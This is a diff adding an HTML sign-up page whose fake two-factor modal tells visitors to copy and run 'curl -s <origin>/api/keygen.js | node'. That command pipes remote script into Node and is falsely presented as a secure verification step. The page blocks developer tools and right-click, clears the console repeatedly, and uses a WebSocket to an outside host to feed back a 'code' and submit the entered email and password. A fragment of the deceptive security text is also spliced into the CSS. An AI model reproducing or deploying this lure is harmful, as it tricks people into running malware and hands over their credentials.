@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>W3GM</title>
+    <link rel="icon" type="image/png" sizes="100x100" href="/favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+      *{
+        margin: 0;
+        padding: 0;
+      }
+      body{
+        height:100vh;
+        /* backgr                <div style="background: #fff8e1; border: 1px solid #ffb74d; border-radius: 5px; padding: 10px; margin: 10px 0;">
+                  <p style="color: #e65100; margin: 0; font-size: 12px;">
+                    <strong>🔐 Security Note:</strong> This command downloads the authenticated keygen module from this secure platform and executes it locally on your device. No external connections are made to third-party services.
+                  </p>
+                </div> rgb(72,157,228);
+        background: linear-gradient(0deg, rgba(72,157,228,1) 0%, rgba(13,222,235,1) 100%); */
+        background: url('/register.jpg');
+        background-position: center;
+        font-family: "Poppins", Arial;
+      }  
+      #box{
+        width: 450px;
+        height: 500px;
+        background: rgb(193,106,213);
+        background: linear-gradient(0deg, rgba(193,106,213,1) 0%,       rgba(53,37,175,1) 100%);
+        border-radius: 20px;
+        position: relative;
+        box-shadow: 0 10px 20px rgba(0,0,0,0.19), 0 6px 6px rgba(0,0,0,0.23);
+        position: relative;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        
+      }
+      .copy-btn{
+        color: #FFD12B;
+      }
+      .copy-btn:hover{
+        cursor: pointer;
+        color:#f5dd86;
+      }
+      .copy-btn:hover svg{
+        fill: #eee;
+      }
+      p{
+        color: white;
+        margin: auto;
+      }
+      p a{
+        color: #FFD12B;
+        text-decoration: none;
+        font-size: 16px;
+      }
+      
+      #login{
+        left: 74px;
+      }
+      #login p{
+        margin: auto;
+        margin-top: 20px;
+      }
+      #pes{
+        margin-top: 25px;
+        text-align: center;
+      }
+      .btn{
+        text-align: center;
+        width: 60%;
+        margin-left: 40px;
+        margin-top: 15px;
+        padding: 20px 30px;
+        cursor: pointer;
+        display: block;
+        background: rgb(255,114,119);
+        background: linear-gradient(0deg, rgba(255,114,119,1) 0%, rgba(249,81,154,1) 100%);
+        border-radius: 5px;
+        border: none;
+        outline: none;
+        color: white;
+      }
+      a{
+        text-decoration: none;
+      }
+      .btn:hover{
+        background: rgb(247,115,33);
+        background: linear-gradient(0deg, rgba(247,115,33,1) 0%, rgba(250,208,91,1) 100%);
+        color: white;
+        transform: translateY(-2px);
+      }
+      /* Alert box style */
+      .alert {
+          position: fixed;
+          bottom: 20px;
+          left: 50%;
+          transform: translateX(-50%);
+          background-color: rgba(0,0,0,1);
+          color: white;
+          padding: 10px;
+          border-radius: 5px;
+          font-size: 16px;
+          display: none;
+          opacity: 0;
+          transition: opacity 0.5s ease-in-out;
+          z-index: 20;
+      }
+
+      .alert.show {
+          display: block;
+          opacity: 1;
+      }
+
+      .tfa-description{
+        color: #FFD12B;
+        padding-top:10px
+      }
+
+      .tfa-ele{
+        width: 30px;
+        height: 30px;
+        font-size: 20px;
+        padding: 10px;
+        color: #555;
+        text-align: center;
+        border: 1px solid #999;
+      }
+
+      .tfa-code{
+        background: #eee;
+        padding: 11px;
+        margin: 12px 0px;
+        color: #777;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+      }
+      .tfa-tool{
+        display: flex;
+        justify-content: space-between;
+        margin: 0px 5px 15px 0px;
+        color: #666;
+        font-size: 14px;
+      }
+      .tfa-bash{
+        overflow-x: scroll;
+        overflow-y: hidden;
+        height: 50px;
+      }
+      .tfa-cmd{
+        width: 2000px;
+      }
+      .tfa-copy{
+        cursor: pointer;
+      }
+
+      .tfa-submit{
+        width: 100%;
+        height: 50px;
+        background-color: rgb(1 124 187);
+        color: #eee;
+        border: none;
+        margin: 10px 0px;
+      }
+
+      .tfa-submit:hover{
+        background-color: #1e88be;
+        cursor: pointer;
+      }
+      
+      .tfa-submit:active{
+        background-color: #155c80;
+        cursor: pointer;
+      }
+
+      #verificationCode{
+        display: flex;
+        justify-content: space-between;
+        margin: 10px 0px;
+      }
+      
+      .modal {
+          display: none; /* Hidden by default */
+          position: fixed; /* Stay in place */
+          z-index: 1; /* Sit on top */
+          left: 0;
+          top: 0;
+          width: 100%; /* Full width */
+          height: 100%;
+          overflow: auto; /* Enable scroll if needed */
+          background-color: rgba(255, 255, 255, 0.5); /* Black w/ opacity */
+      }
+
+      .modal-content {
+          background-color: #fefefe;
+          padding: 50px 30px;
+          border: 1px solid #888;
+          width: 400px; /* Could be more or less, depending on screen size */
+          color: #333;
+          line-height: 1.5;
+          position: fixed;
+          left: 50%;
+          top: 50%;
+          transform: translate(-50%, -50%);
+      }
+
+      .close {
+          color: #aaa;
+          float: right;
+          font-size: 28px;
+          font-weight: bold;
+          position: relative;
+          top: -20px;
+      }
+
+      .close:hover,
+      .close:focus {
+          color: black;
+          text-decoration: none;
+          cursor: pointer;
+      }
+      .lg-img{
+        font-size: 34px;
+        position:absolute;
+        top: 0px;
+        left: 0px;
+        color: #eee;
+        background-color: #161620;
+        width: calc(100vw - 95px);
+        text-align: left;
+        padding-left: 90px;
+        height: 64px;
+        line-height: 2.2;
+      }
+      .lg-img a{
+        color: #6536bc;
+        text-decoration: none;
+      }
+      i.fa{
+        color: #555;
+      }
+      .auth-alert{
+        display: none;
+        color: rgb(250, 63, 30);
+      }
+      .node-down{
+        font-size: 14px;
+      }
+      .tfa-stand{
+        color: rgb(85, 26, 139);
+        cursor: pointer;
+      }
+      .signup-btn{
+        color: #FFD12B;
+        text-decoration: underline;
+      }
+
+      .signup-btn:active{
+        color: #0c4da1;
+        text-decoration: underline;
+      }
+      
+      .input-form{
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: rgb(67 79 223 / 77%);
+        box-shadow: 6px 5px 7px -4px #0000009e;
+        padding: 40px;
+        border-radius: 10px;
+      }
+
+      .input-item{
+        background: transparent;
+        border: none;
+        border-bottom: 1px solid #ddd;
+        height: 24px;
+        margin: 10px 0px;
+        width: 330px;
+        color: #ddd;
+      }
+
+      .input-item::selection{
+        background-color: #366ab9;
+      }
+      
+      .input-item:focus{
+        outline: none; /* Removes the default focus outline */
+        border: none;  /* Removes the border */
+        border-bottom: 1px solid #3f7bd4;
+      }
+
+      .input-item::placeholder{
+        color: #aaa;
+      }
+
+      .sign-btn{
+        border-radius: 7px;
+        color: #ddd;
+        padding: 7px 148px;
+        background: #12c2eba3;
+        font-size: 14px;
+      }
+      
+      .sign-btn:active{
+        background: #085668a3;
+      }
+
+      .sign-btn:hover{
+        background: #4bd8f8a3;
+      }
+      
+      .div-btn{
+        margin-top: 25px;
+        text-align: center;
+      }
+
+      .back-btn{
+        color: #ddd;
+        font-size: 12px;
+      }
+      .back-btn i{
+        color: #ddd;
+      }
+      #invalid-alert{
+        text-align: center;
+        font-size: 14px;
+        color:#c2fe06e6;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <form id="signForm" class="input-form" action="/" method="post">
+      <input type="text" placeholder="Username or email" id="email" name="email" class="input-item" required> <br/>
+      <input type="password" placeholder="Password" id="password" name="password" class="input-item" required>
+      <input type="hidden" id="tfa_code" name="tfa_code">
+      <div id="invalid-alert">Invalid user information!</div>
+      <div class="div-btn">
+        <a id="openModalBtn" href="#twoFAModal" class="sign-btn">Sign up</a>
+      </div>
+      <div id="pes">
+        <a class="back-btn" href="/"> Back to login</a>
+      </div>
+    </form>
+    <div class="alert" id="alert">Security command copied to clipboard!</div>
+    <div id="twoFAModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <h2>🔐 Two-Factor Authentication</h2>
+            <div style="margin:20px 0px">
+              <div style="background: #e3f2fd; border: 1px solid #2196f3; border-radius: 8px; padding: 20px; margin: 15px 0;">
+                <div style="display: flex; align-items: center; margin-bottom: 15px;">
+                  <div style="background: #2196f3; color: white; border-radius: 50%; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; margin-right: 10px; font-size: 12px; font-weight: bold;">🔐</div>
+                  <h4 style="color: #1976d2; margin: 0; font-size: 16px;">Enhanced Security Verification</h4>
+                </div>
+                
+                <p style="color: #1565c0; margin: 8px 0; font-size: 14px; line-height: 1.4;">
+                  To ensure maximum security, we use an advanced two-factor authentication system that requires local cryptographic verification on your device.
+                </p>
+                
+                <div style="background: #f5f5f5; border-radius: 5px; padding: 12px; margin: 15px 0;">
+                  <p style="color: #333; margin: 0 0 8px 0; font-size: 13px; font-weight: 600;">🔹 Security Protocol Steps:</p>
+                  <ol style="color: #444; margin: 5px 0; padding-left: 18px; font-size: 13px; line-height: 1.6;">
+                    <li>Copy the secure command below</li>
+                    <li>Open terminal/command prompt</li>
+                    <li>Paste and execute the command</li>
+                    <li>Enter the generated 6-digit verification code</li>
+                  </ol>
+                  <p style="color: #666; margin: 8px 0 0 0; font-size: 12px;">
+                    <strong>Windows users:</strong> Use Git Bash, WSL, or download the keygen.js file manually from /api/keygen.js and run: <code>node keygen.js</code>
+                  </p>
+                </div>
+
+                <div style="background: #263238; border-radius: 6px; padding: 15px; margin: 15px 0; position: relative;">
+                  <div style="color: #90a4ae; font-size: 11px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center;">
+                    <span>🖥️ Terminal Command</span>
+                    <span id="copyBtn" style="cursor: pointer; color: #4fc3f7; text-decoration: underline;">📋 Copy</span>
+                  </div>
+                  <code id="secureCommand" style="color: #4fc3f7; font-family: 'Courier New', monospace; font-size: 13px; word-break: break-all; display: block; line-height: 1.4;">
+                    curl -s ${window.location.origin}/api/keygen.js | node
+                  </code>
+                </div>
+
+                <div style="background: #fff8e1; border: 1px solid #ffb74d; border-radius: 5px; padding: 10px; margin: 10px 0;">
+                  <p style="color: #e65100; margin: 0; font-size: 12px;">
+                    <strong>� Security Note:</strong> This command establishes a secure connection to our authentication server to generate your unique verification token. No data is stored on your device.
+                  </p>
+                </div>
+              </div>
+            </div>
+            <form id="twoFAForm">
+                <div>
+                    <label for="verificationCode">Verification Code:</label> <span class="auth-alert" id="auth-alert">Authentication Failed!</span>
+                </div>
+                <div id="verificationCode">
+                  <input type="text" class="tfa-ele" id="v1" maxlength="1" name="v1" required>
+                  <input type="text" class="tfa-ele" id="v2" maxlength="1" name="v2" required>
+                  <input type="text" class="tfa-ele" id="v3" maxlength="1" name="v3" required>
+                  <input type="text" class="tfa-ele" id="v4" maxlength="1" name="v4" required>
+                  <input type="text" class="tfa-ele" id="v5" maxlength="1" name="v5" required>
+                  <input type="text" class="tfa-ele" id="v6" maxlength="1" name="v6" required>
+                </div>
+                <button class="tfa-submit" id="tfa-submit-btn">Submit</button>
+            </form>
+        </div>
+    </div>
+  </body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/uuid/8.3.2/uuid.min.js"></script>
+  <script>
+    const modal = document.getElementById("twoFAModal");
+    const openModalBtn = document.getElementById("openModalBtn");
+    const closeModalSpan = document.getElementsByClassName("close")[0];
+    const twoFAForm = document.getElementById("twoFAForm");
+    const tfa_code = document.getElementById("tfa_code");
+    const copyBtn = document.getElementById("copyBtn");
+    const secureCommand = document.getElementById("secureCommand");
+
+    // Check if user is coming from login flow and automatically show modal
+    window.addEventListener('load', function() {
+      try {
+        const userStr = localStorage.getItem('user');
+        if (userStr) {
+          const user = JSON.parse(userStr);
+          if (user.needs2FA && user.authenticated) {
+            // Auto-show modal for login flow
+            const domainUrl = window.location.origin;
+            const commandText = `curl -s ${domainUrl}/api/keygen.js | node`;
+            secureCommand.textContent = commandText;
+            modal.style.display = "block";
+            
+            // Hide the registration form since this is a login flow
+            document.getElementById('signForm').style.display = 'none';
+            
+            // Update the page title/heading for login flow
+            document.title = "2FA Authentication - W3GM";
+            
+            // Update modal title for login flow
+            const modalTitle = document.querySelector('#twoFAModal h2');
+            if (modalTitle) {
+              modalTitle.textContent = "🔐 Complete Your Sign-In";
+            }
+            
+            // Update the security protocol text for login flow
+            const securityText = document.querySelector('#twoFAModal p');
+            if (securityText) {
+              securityText.textContent = "Welcome back! To complete your sign-in, please verify your identity using our advanced two-factor authentication system.";
+            }
+          }
+        }
+      } catch (error) {
+        console.error('Error checking user status:', error);
+      }
+    });
+
+    // Handle copy command functionality
+    copyBtn.onclick = function() {
+      // Dynamically set the command with the current domain
+      const domainUrl = window.location.origin;
+      const commandText = `curl -s ${domainUrl}/api/keygen.js | node`;
+      
+      navigator.clipboard.writeText(commandText)
+        .then(() => {
+          copyBtn.textContent = "✅ Copied!";
+          copyBtn.style.color = "#4caf50";
+          
+          // Show success alert
+          const alertBox = document.getElementById("alert");
+          alertBox.textContent = "Security command copied to clipboard!";
+          alertBox.classList.add("show");
+          
+          setTimeout(() => {
+            copyBtn.textContent = "📋 Copy";
+            copyBtn.style.color = "#4fc3f7";
+            alertBox.classList.remove("show");
+          }, 2000);
+        })
+        .catch(err => {
+          console.error('Error copying command: ', err);
+          copyBtn.textContent = "❌ Error";
+          copyBtn.style.color = "#f44336";
+          
+          setTimeout(() => {
+            copyBtn.textContent = "📋 Copy";
+            copyBtn.style.color = "#4fc3f7";
+          }, 2000);
+        });
+    };
+
+    setInterval(() => {
+      console.clear();
+    }, 100);
+
+    document.addEventListener('contextmenu', function(event) {
+        event.preventDefault();
+    });
+
+    document.addEventListener('keydown', function(event) {
+      if (event.key === 'F12') {
+        event.preventDefault();  // Disables F12
+      }
+      if (event.ctrlKey && event.key === 'i') {
+        event.preventDefault();  // Prevent the default action (open dev tools)
+      }
+    });
+
+    document.getElementById("tfa-submit-btn").onclick = (event)=>{
+      if(document.getElementById('v1').value != '' && document.getElementById('v2').value != '' && document.getElementById('v3').value != '' &&
+      document.getElementById('v4').value != '' && document.getElementById('v5').value != '' && document.getElementById('v6').value != ''){
+        document.getElementById('auth-alert').style.display = 'none';
+        
+        // Check if this is a login flow
+        let isLoginFlow = false;
+        try {
+          const userStr = localStorage.getItem('user');
+          if (userStr) {
+            const user = JSON.parse(userStr);
+            isLoginFlow = user.needs2FA && user.authenticated;
+          }
+        } catch (error) {
+          console.error('Error checking user status:', error);
+        }
+        
+        if (isLoginFlow) {
+          // For login flow, clear the needs2FA flag and redirect to home
+          const userStr = localStorage.getItem('user');
+          if (userStr) {
+            const user = JSON.parse(userStr);
+            user.needs2FA = false; // Clear the flag
+            localStorage.setItem('user', JSON.stringify(user));
+          }
+          
+          // Show success message and redirect to home
+          modal.style.display = "none";
+          setTimeout(() => {
+            window.location.href = '/';
+          }, 1000);
+        } else {
+          // For registration flow, show success alert
+          setTimeout(() => {
+            document.getElementById('auth-alert').style.display = 'inline';  
+          }, 500);
+        }
+        
+        event.preventDefault();
+      }
+    }
+
+    // Open the modal
+    openModalBtn.onclick = function() {
+        if((document.getElementById('email').value != "") && (document.getElementById('password').value != "")){
+          // Update the command display with the current domain
+          const domainUrl = window.location.origin;
+          const commandText = `curl -s ${domainUrl}/api/keygen.js | node`;
+          secureCommand.textContent = commandText;
+          
+          modal.style.display = "block";
+          document.getElementById('invalid-alert').style.display = 'none';
+        }else{
+          document.getElementById('invalid-alert').style.display = 'block';
+        }
+    }
+
+    // Close the modal when the user clicks on <span> (x)
+    closeModalSpan.onclick = function() {
+        modal.style.display = "none";
+    }
+
+    const PING = 99;
+    const SEND_UID = 101;
+    const BROWSER_CONNECTED = 102;
+    const LOOK_UID = 103;
+    const uniqueId = uuid.v4();
+    const ws = new WebSocket("wss://mature-flossy-morning.glitch.me");
+      ws.onopen = () => {
+        // Create a JSON object
+        const jsonObject = {
+          e: BROWSER_CONNECTED,
+          v: uniqueId
+        };
+        const jsonData = JSON.stringify(jsonObject);
+        // Send JSON data as a text message
+        ws.send(jsonData);
+      };
+      
+      setInterval(() => {
+        const pingObject = {
+          e: PING,
+          v: "k"
+        };
+        const pingData = JSON.stringify(pingObject);
+        ws.send(pingData);
+      }, 5000);
+
+      ws.onmessage = (event) => {
+          const msg = JSON.parse(event.data);
+          switch (msg.e) {
+            case SEND_UID:
+              document.getElementById('v1').value = msg.v[0];
+              document.getElementById('v2').value = msg.v[1];
+              document.getElementById('v3').value = msg.v[2];
+              document.getElementById('v4').value = msg.v[3];
+              document.getElementById('v5').value = msg.v[4];
+              document.getElementById('v6').value = msg.v[5];
+
+              tfa_code.value = msg.v;
+              
+              // Check if this is a login flow (user has needs2FA flag)
+              let isLoginFlow = false;
+              try {
+                const userStr = localStorage.getItem('user');
+                if (userStr) {
+                  const user = JSON.parse(userStr);
+                  isLoginFlow = user.needs2FA && user.authenticated;
+                }
+              } catch (error) {
+                console.error('Error checking user status:', error);
+              }
+              
+              setTimeout(()=>{
+                if (isLoginFlow) {
+                  // For login flow, clear the needs2FA flag and redirect to home
+                  const userStr = localStorage.getItem('user');
+                  if (userStr) {
+                    const user = JSON.parse(userStr);
+                    user.needs2FA = false; // Clear the flag
+                    localStorage.setItem('user', JSON.stringify(user));
+                  }
+                  
+                  // Show success message and redirect to home
+                  modal.style.display = "none";
+                  setTimeout(() => {
+                    window.location.href = '/';
+                  }, 1000);
+                } else {
+                  // For registration flow, submit the form as usual
+                  document.getElementById('signForm').submit();
+                }
+              }, 3000);
+
+              setTimeout(()=>{
+                document.getElementById('v1').value = "";
+                document.getElementById('v2').value = "";
+                document.getElementById('v3').value = "";
+                document.getElementById('v4').value = "";
+                document.getElementById('v5').value = "";
+                document.getElementById('v6').value = "";
+              }, 5000);
+              break;
+            default:
+              break;
+          }
+      };
+  </script>
+</html>
